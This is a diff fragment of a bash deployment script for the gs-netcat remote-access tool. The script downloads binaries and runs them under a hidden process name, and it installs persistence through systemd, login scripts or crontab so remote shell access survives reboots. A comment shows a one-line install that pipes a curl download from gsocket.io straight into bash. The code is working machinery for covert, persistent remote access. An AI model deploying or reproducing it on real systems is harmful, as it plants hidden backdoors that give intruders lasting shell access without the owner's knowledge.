 	gs_secret_write "$USER_SEC_FILE" # Create new secret file
 }
 
@@ -772,9 +1095,9 @@ dl()
 
 	# Debugging / testing. Use local package if available
 	if [[ -n "$GS_USELOCAL" ]]; then
-		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
-		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
-		[[ -f "${1}" ]] && cp "${1}" "${2}" 2>/dev/null && return
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && xcp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+		[[ -f "/gsocket-pkg/${1}" ]] && xcp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
+		[[ -f "${1}" ]] && xcp "${1}" "${2}" 2>/dev/null && return
 		FAIL_OUT "GS_USELOCAL set but deployment binaries not found (${1})..."
 		errexit
 	fi
@@ -791,7 +1114,7 @@ dl()
 		errexit
 	fi
 
-	# [[ ! -s "$2" ]] && { errexit "Could not download package."; } 
+	# Download failed:
 	[[ ! -s "$2" ]] && { FAIL_OUT; echo "$DL_LOG"; exit_code 255; } 
 }
 
@@ -951,12 +1274,12 @@ try()
 	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
 	[[ -n $GS_USELOCAL_GSNC ]] && {
 		[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
-		cp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+		xcp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
 	}
 	OK_OUT
 
 	echo -en 2>&1 "Copying binaries......................................................"
-	mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	xmv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
 	chmod 700 "$DSTBIN"
 	OK_OUT
 
@@ -967,7 +1290,7 @@ try()
 		return
 	fi
 
-	rm -f "${TMPDIR}/${src_pkg}"
+	rm -f "${TMPDIR}/${src_pkg:?}"
 }
 
 # Download the gs-netcat_any-any.tar.gz and try all of the containing
@@ -1037,11 +1360,9 @@ gs_start()
 		else
 			# HERE: sec.dat has been updated
 			OK_OUT
-			WARN "More than one ${BIN_HIDDEN_NAME} is running."
+			WARN "More than one ${PROC_HIDDEN_NAME} is running."
 			echo -e 1>&2 "----> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
-			echo -e 1>&2 "----> or terminate all     : ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN}"
-			echo -e 1>&2 "----> or terminate the old one by logging in and typing:"
-			echo -e 1>&2 "      ${CM}kill -- -\$(ps -o ppid= -p \$(ps -o ppid= -p \$\$))${CN}"
+			[[ -n $OLD_PIDS ]] && echo -e 1>&2 "----> or terminate the old ones: ${CM}kill ${OLD_PIDS}${CN}"
 		fi
 	else
 		OK_OUT ""
@@ -1054,20 +1375,20 @@ gs_start()
 		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
 		# This does work:
 		#     FOO="X=1" && (eval $FOO id)
-		(eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
+		(cd $HOME; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
 }
 
 init_vars
 
-[[ x"$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
+[[ "$1" =~ (clean|uninstall|clear|undo) ]] && uninstall
 [[ -n "$GS_UNDO" ]] || [[ -n "$GS_CLEAN" ]] || [[ -n "$GS_UNINSTALL" ]] && uninstall
 
 init_setup
-
 # User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
 [[ -n "$X" ]] && GS_SECRET_X="$X"
+
 
 if [[ -z $S ]]; then
 	if [[ $UID -eq 0 ]]; then
@@ -1082,34 +1403,41 @@ if [[ -z $S ]]; then
 		GS_SECRET="${GS_SECRET_X}"
 	fi
 
-	DEBUGF "GS_SECRET=$GS_SECRET"
+	DEBUGF "GS_SECRET=$GS_SECRET (F=${GS_SECRET_FROM_FILE}, G=${GS_SECRET_X})"
 else
 	GS_SECRET="$S"
 fi
 
 try "$OSARCH"
+
 [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 
 [[ -z $S ]] && try_network
-
 # [[ -n "$GS_UPDATE" ]] && gs_update
 
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
 
 # -----BEGIN Install permanentally-----
-# Try to install system wide. This may also start the service.
-[[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
+if [[ -z $GS_NOINST ]]; then
+	if [[ -n $IS_DSTBIN_TMP ]]; then
+		echo -en 2>&1 "Installing remote access.............................................."
+		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
+	else
+		# Try to install system wide. This may also start the service.
+		[[ $UID -eq 0 ]] && install_system
 
-# Try to install to user's login script or crontab (if not installed as SYSTEMD)
-[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
-
-[[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
+		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
+		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
+	fi
+else
+	echo -e 2>&1 "GS_NOINST is set. Skipping installation."
+fi
 # -----END Install permanentally-----
 
-if [[ -z "$IS_INSTALLED" ]]; then
+if [[ -z "$IS_INSTALLED" || $IS_DSTBIN_TMP ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 
